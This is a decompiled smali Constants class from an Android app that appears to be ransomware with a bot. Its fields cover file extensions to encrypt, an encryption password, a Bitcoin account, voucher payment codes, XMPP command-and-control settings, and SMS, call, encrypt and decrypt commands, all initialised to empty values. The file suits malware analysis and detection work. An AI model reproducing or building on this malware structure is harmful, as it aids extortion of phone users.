.class public Lcom/androiddg/pgroute/Constants;
.super Ljava/lang/Object;
.source "Constants.java"


# static fields
.field public static ADMIN_ACCESS_MESSAGE:Ljava/lang/String; = null

.field public static AFFILIATE_ID:Ljava/lang/String; = null

.field public static BAD_FILENAMES:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static BITCOIN_ACCOUNT:Ljava/lang/String; = null

.field public static BOT_ID:Ljava/lang/String; = null

.field public static BUILD_ID:Ljava/lang/String; = null

.field public static BUILTIN_JID_CONFIG:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static COMMAND_BITCOIN_ACCOUNT:Ljava/lang/String; = null

.field public static COMMAND_BOT_ID:Ljava/lang/String; = null

.field public static COMMAND_CALL:Ljava/lang/String; = null

.field public static COMMAND_DECRYPT:Ljava/lang/String; = null

.field public static COMMAND_ENCRYPT:Ljava/lang/String; = null

.field public static COMMAND_HELLO:Ljava/lang/String; = null

.field public static COMMAND_JID_CONFIG:Ljava/lang/String; = null

.field public static COMMAND_PASSWORD:Ljava/lang/String; = null

.field public static COMMAND_SECRET:Ljava/lang/String; = null

.field public static COMMAND_SERVER_MESSAGES:Ljava/lang/String; = null

.field public static COMMAND_SMS:Ljava/lang/String; = null

.field public static COMMAND_VOUCHER_MESSAGE:Ljava/lang/String; = null

.field public static final CONFIG_NAME:Ljava/lang/String; = "kvdwwpti"

.field public static final CONFIG_XOR_KEY:Ljava/lang/String; = "lnhqsjgrbnjbq"

.field public static final DEBUG_TAG:Ljava/lang/String; = "sbkjnmcgpc"

.field public static ENCODED_FILE_EXTENSION:Ljava/lang/String; = null

.field public static ENCRYPT_PASSWORD:Ljava/lang/String; = null

.field public static EXTENSIONS_TO_ENCRYPT:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static FILES_WERE_DECRYPTED:Z = false

.field public static FILES_WERE_ENCRYPTED:Z = false

.field public static INVALID_VOUCHER_MASKS:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static final MONEYPACK_DIGITS_NUMBER:I = 0xe

.field public static final POLLING_TIME_MINUTES:I = 0x5a

.field public static final PREFS_NAME:Ljava/lang/String; = "fctewaqlcem"

.field public static PRIVATE_JID_CONFIG:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static PRIVATE_PASSWORD:Ljava/lang/String; = null

.field public static PUBLIC_PASSWORD:Ljava/lang/String; = null

.field public static READY_FOR_DECRYPTION:Z = false

.field public static SUCCESS_JID_CONFIG:Ljava/lang/String; = null

.field public static THREAD_ID:Ljava/lang/String; = null

.field public static final VANILLA_RELOAD_DIGITS_NUMBER:I = 0xa

.field public static VOUCHER_CODE:Ljava/lang/String;

.field public static VOUCHER_ERROR_MESSAGE:Ljava/lang/String;

.field public static VOUCHER_TYPE:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    const/4 v1, 0x0

    .line 12
    sput-object v1, Lcom/androiddg/pgroute/Constants;->VOUCHER_TYPE:Ljava/lang/String;

    .line 13
    sput-boolean v2, Lcom/androiddg/pgroute/Constants;->READY_FOR_DECRYPTION:Z

    .line 17
    sput-object v1, Lcom/androiddg/pgroute/Constants;->VOUCHER_ERROR_MESSAGE:Ljava/lang/String;

    .line 19
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androiddg/pgroute/Constants;->PRIVATE_JID_CONFIG:Ljava/util/List;

    .line 21
    sput-object v1, Lcom/androiddg/pgroute/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    .line 24
    sput-object v1, Lcom/androiddg/pgroute/Constants;->BITCOIN_ACCOUNT:Ljava/lang/String;

    .line 26
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androiddg/pgroute/Constants;->INVALID_VOUCHER_MASKS:Ljava/util/List;

    .line 32
    sput-object v1, Lcom/androiddg/pgroute/Constants;->BOT_ID:Ljava/lang/String;

    .line 33
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androiddg/pgroute/Constants;->BAD_FILENAMES:Ljava/util/List;

    .line 34
    sput-object v1, Lcom/androiddg/pgroute/Constants;->SUCCESS_JID_CONFIG:Ljava/lang/String;

    .line 39
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androiddg/pgroute/Constants;->BUILTIN_JID_CONFIG:Ljava/util/List;

    .line 40
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androiddg/pgroute/Constants;->EXTENSIONS_TO_ENCRYPT:Ljava/util/List;

    .line 41
    sput-boolean v2, Lcom/androiddg/pgroute/Constants;->FILES_WERE_DECRYPTED:Z

    .line 42
    sput-boolean v2, Lcom/androiddg/pgroute/Constants;->FILES_WERE_ENCRYPTED:Z

    .line 46
    sput-object v1, Lcom/androiddg/pgroute/Constants;->VOUCHER_CODE:Ljava/lang/String;

    .line 48
    sput-object v1, Lcom/androiddg/pgroute/Constants;->PRIVATE_PASSWORD:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method
